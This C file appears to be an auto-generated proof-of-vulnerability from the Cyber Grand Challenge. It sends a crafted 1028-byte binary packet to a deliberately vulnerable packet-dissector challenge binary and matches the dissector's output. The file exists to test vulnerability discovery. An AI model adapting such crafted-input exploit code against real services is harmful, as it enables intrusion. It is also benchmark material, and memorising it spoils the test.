#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xde\x92\x6d\xbf"
         "\xf0\x78\x17\x6b\x5e\x8f\x9c\x62\x25\x8c\x6e\x3d\x1f\xab\xc7\x3e"
         "\xe0\x01\x00\x00\x2b\x25\xe5\x4e\x0e\xec\xbc\x8d\xcb\xa0\x7c\x98"
         "\xc1\x08\x60\x52\xd5\xfa\xac\x24\xe1\xa3\xe2\x11\x87\x7c\x39\x80"
         "\x20\xd2\x17\xce\x2a\xe2\x67\x1c\x9a\xa5\xe2\x41\x33\xdf\xe7\xb0"
         "\xb1\x8d\x67\xc0\x75\x69\x73\xb9\x46\x5c\x2e\xd3\x60\x28\x5f\x0a"
         "\xc2\xca\xf6\xc5\xf8\x8a\xe8\x11\x77\xfb\xc8\xb7\xe2\xef\xc5\x40"
         "\xff\x94\x88\xe4\xdc\x4a\x1b\xfb\x15\xfb\xc3\x52\x03\x04\x93\x6e"
         "\x96\xfd\x80\x62\x0f\xb3\x4e\x69\x37\x86\x9b\x72\x8d\xa3\x62\xbb"
         "\xf8\xe9\x25\xa1\xc1\x60\x05\x37\xfb\xda\x4e\xd1\xf5\x3c\xe5\x4f"
         "\x8c\x0f\x20\x5f\xdd\x5e\xb0\x5b\xb4\xd1\xef\x30\x09\xe7\x1d\x57"
         "\x87\x82\x1a\x2c\xad\x83\xac\xea\xb5\xac\xf8\xe6\xe9\x40\xd1\xc4"
         "\xc6\xf8\x40\xbf\x58\x0c\x36\x5d\x92\x21\x0a\x8b\xbe\x70\x93\xc3"
         "\xdf\x50\x3f\xf6\x5a\x03\xea\x3b\x19\xf9\xb2\xaf\x36\x9e\x9d\xc0"
         "\x4a\x0a\x2a\x0e\x0e\x4c\x47\xfe\xb0\x9c\x34\xa5\x25\x20\x0a\xc4"
         "\x06\x70\xc9\xd9\x84\xfd\xc2\xe7\x8c\xfe\x0f\x3f\xe1\xa2\xf7\x80"
         "\x9d\x4b\x1a\x36\x15\x73\x63\x00\x7c\x87\x45\x42\xb0\x48\x8a\x71"
         "\x82\xc5\x10\xbb\xca\x45\xe0\x55\x85\x10\xd8\x24\x0f\x05\xe2\xf7"
         "\xdf\xa1\x84\x5a\x30\x96\x47\xb3\x14\xe7\xa6\x7f\xb9\x62\xd8\x18"
         "\xf9\xb9\x72\x9a\x1a\xfc\x72\x8d\x77\x4f\x1d\x2e\x3d\x24\xdc\xec"
         "\xda\x1f\xa1\x5f\x70\x92\xe9\xbe\x19\xa8\xbb\x40\xc9\xed\x24\x66"
         "\x5b\x58\x1e\xec\x1c\xf2\x5e\x57\xb8\x59\xf5\x93\xe0\x82\xbc\x7f"
         "\x26\x74\x48\x2c\xda\x1b\xcb\xd2\x97\x99\x3f\x89\x69\xe8\xba\xbd"
         "\x23\x17\xd1\x5d\xf2\x34\x49\x7f\xb4\x1b\x95\x5d\xa1\x43\xba\x18"
         "\x4b\x8a\x23\x98\x5b\x8c\x7a\xbd\x51\x4e\xf7\xf8\x64\x79\x95\xc7"
         "\x8e\x90\x51\x6a\x36\x03\x3e\x33\x94\x88\xf5\x52\xb9\x29\xfb\x09"
         "\x05\x72\x4a\xf9\xeb\xa8\x92\x8a\x4d\xef\x06\xcc\x17\x17\x13\x45"
         "\xef\x5a\xfa\x6d\x5c\xe8\xdd\x8b\x1c\xa7\x72\x88\x28\x33\x02\x98"
         "\xbe\xf5\xed\xa3\x12\x25\x07\xb7\x76\xb0\xc5\x85\xf9\xb1\xc6\xa0"
         "\x63\x95\x18\xaf\x2a\xf3\x82\x3b\x1c\x8a\x1c\x62\x04\xe8\x8e\x28"
         "\x99\x41\x26\x7a\x90\x20\x0c\x41\x4e\xbf\x87\x5b\x08\x2b\x63\xa5"
         "\x2d\x53\x29\x8f\x76\xc3\x3f\x7f\x23\x62\x3b\x9a\xbc\x52\xf6\xe7"
         "\xb7\xb2\x2c\x9a\xf5\x8a\x1c\x7f\xc6\x9b\x26\x0c\x45\x00\x08\xc8"
         "\xc8\x69\x4b\xfc\xe1\x13\xfe\x64\x2d\xb7\xa2\xed\xf5\x00\x86\x0c"
         "\x45\x1c\xa9\x18\x29\xe6\xf3\xe6\x29\x63\xf2\x65\xdf\x3a\x4a\x7a"
         "\x6a\xaf\x1a\x73\x25\x1d\x9d\xcf\xf5\x4c\xec\x8e\xe2\x17\x7f\x85"
         "\x85\xa7\x04\xf3\x10\x92\x97\x1a\x9d\x00\x4b\xff\x06\xdd\x92\xe9"
         "\x84\x34\x12\xd5\xa9\xdb\xfb\x69\xe3\x6a\xe0\x0c\xa5\x94\x58\x01"
         "\x15\x89\xde\xfa\xbe\x48\xd2\x7e\x1c\xbb\x5f\x51\x6c\xf0\xdd\xf7"
         "\x65\x2f\x0c\x45\xf9\x9a\x7b\x14\x26\xe5\xba\x36\xeb\x5a\xe6\xcf"
         "\x38\xed\x10\xf1\x63\x6c\xc2\x09\x5e\x80\x7f\xfa\xe9\xd8\xd4\x1e"
         "\x1b\xb0\x89\x53\x34\x59\xca\x69\xff\xc2\x99\xc0\x76\xda\xfd\x80"
         "\x7a\xf9\x1f\x17\xae\xa9\xc9\x08\x50\xa7\xae\x90\x9f\x2e\x2b\x85"
         "\x6c\xe6\x27\x9e\x6e\xaa\xcc\x4b\x6b\xc7\x56\x7c\x3e\x3b\xe6\xe6"
         "\x13\x21\x5c\xd4\xae\xe5\xcb\x73\x17\x3d\xbb\x5a\x97\xe6\xa6\xb9"
         "\x3c\x41\x24\xa0\x65\x55\xbc\x89\x8e\xc8\x15\x09\x60\x89\xc4\x36"
         "\xec\xd7\x94\x71\x49\xe8\xab\x06\x36\x67\x1c\xc1\x9a\x16\x69\x75"
         "\x62\x9f\xa4\xaf\x2a\x5e\x33\x1f\x54\x54\xc5\x37\x30\x4c\x82\x9b"
         "\x12\x7c\x3c\x9b\xee\xe7\xbe\xf5\xe9\x1b\x20\xe1\x3c\x1d\xc5\x4f"
         "\xc9\xd8\x9e\x24\x14\x47\xf3\x38\x0d\x33\xff\x43\xa0\x9a\xcc\xaf"
         "\x6a\x8c\x90\xb4\x70\x4b\xc9\x2d\xbb\x7d\x3f\xc2\xf3\x93\x90\xd5"
         "\x91\x51\xf6\xcf\x30\x04\x3b\x9c\x73\x3a\xc2\x28\x98\x97\x32\x8a"
         "\xde\xf0\xb8\x97\xf7\x00\xc4\x77\xb2\x0b\x0a\x98\x94\x2c\x8d\x62"
         "\x8b\x78\x4b\xf3\x30\x2b\x08\xa7\xa6\xd0\x5f\x60\x49\xf5\xbd\x3d"
         "\xbd\x41\x6f\xe4\xa4\x64\x1c\x0f\x87\xae\xea\x60\x47\x64\x90\x88"
         "\x67\xe3\x05\x4c\xe4\x70\xad\xa3\xf0\x06\x5b\xda\x9b\x25\xcb\xb4"
         "\x4c\xa0\x76\x32\x23\x34\x19\x00\x00\x3b\x67\xb8\xce\x58\x0e\x0f"
         "\xe8\x9a\xdc\xae\xf6\x18\x9c\x99\x51\xee\x40\xf9\xa7\xbe\xb5\x55"
         "\xd1\x7a\xfc\x49\x54\x23\xe0\x36\xc5\x40\xe9\xc4\x0a\xeb\xe6\xbf"
         "\xb7\x72\x2b\xe4\x84\x2d\xb9\x78\xfb\x44\x23\x33\xb1\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===androgynyvegetoalkaline
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x6e\x64\x72\x6f\x67\x79\x6e\x79\x76\x65"
         "\x67\x65\x74\x6f\x61\x6c\x6b\x61\x6c\x69\x6e\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*===undercovertcoloss
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x64\x65\x72\x63\x6f\x76\x65\x72\x74"
         "\x63\x6f\x6c\x6f\x73\x73";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 4);
      if (read_00005_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00005_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00005_00000_match;
      pcre *read_00005_00000_pcre = cgc_init_regex(read_00005_00000_regex);
      if (read_00005_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00005_00000_pcre, 0, read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, &read_00005_00000_match);
         if (rc > 0) {
            read_00005_ptr += read_00005_00000_match.match_end - read_00005_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00005_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
